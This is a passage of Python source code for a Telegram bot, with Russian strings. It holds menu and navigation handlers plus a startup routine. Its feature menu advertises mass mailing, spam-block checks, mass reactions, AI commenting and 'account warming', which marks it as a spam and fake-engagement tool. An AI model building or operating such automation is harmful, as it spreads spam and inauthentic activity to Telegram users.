        "⚙️ **Доступные функции**\n\n"
        "📨 Рассылка\n"
        "🚫 Проверка спамблока\n"
        "👍 Массреакции\n"
        "💬 ИИ-комментинг\n"
        "📢 Создание каналов/групп/ботов\n"
        "📸 Авто истории\n"
        "🔥 Прогрев аккаунта"
    )
    
    await message.reply(text)

# Обработчик "Назад в меню"
@app.on_message(filters.regex("^◀️ Назад в меню$"))
@require_channel_subscription
async def back_to_menu_handler(client, message):
    await message.reply(
        "Главное меню:",
        reply_markup=get_main_keyboard()
    )

# Обработчики callback кнопок для навигации
@app.on_callback_query(filters.regex("^back_to_profile$"))
async def back_to_profile_callback(client, callback_query):
    await profile_handler(client, callback_query.message)

@app.on_callback_query(filters.regex("^back_to_referrals$"))
async def back_to_referrals_callback(client, callback_query):
    await referrals_handler(client, callback_query.message)

@app.on_callback_query(filters.regex("^back_to_accounts$"))
async def back_to_accounts_callback(client, callback_query):
    await account_manager_handler(client, callback_query.message)

@app.on_callback_query(filters.regex("^add_acc_from_list$"))
async def add_acc_from_list_callback(client, callback_query):
    await add_account_handler(client, callback_query.message)

# Запуск бота
async def main():
    try:
        # Сначала запускаем клиент
        logger.info("Starting bot...")
        await app.start()
        logger.info("Bot started successfully")
        
        # Затем подключаемся к базе данных
        logger.info("Connecting to database...")
        await db.connect()
        logger.info("Database connected successfully")
        
        # Устанавливаем команды бота
        await app.set_bot_commands([
            types.BotCommand("start", "Запустить бота")
        ])
        
        logger.info("Bot is running. Press Ctrl+C to stop.")
        
        # Держим бота запущенным
        await asyncio.Event().wait()
        
    except Exception as e:
        logger.error(f"Error in main: {e}")
    finally:
        # Закрываем соединения при остановке
        logger.info("Stopping bot...")
        
        # Закрываем соединение с БД
        if db.pool:
            await db.close()
            logger.info("Database connection closed")
        
        # Проверяем, запущен ли клиент, перед остановкой
        try:
            if app.is_connected:
                await app.stop()
                logger.info("Bot stopped")
            else:
                logger.info("Bot was not running")
        except Exception as e:
            logger.error(f"Error stopping bot: {e}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
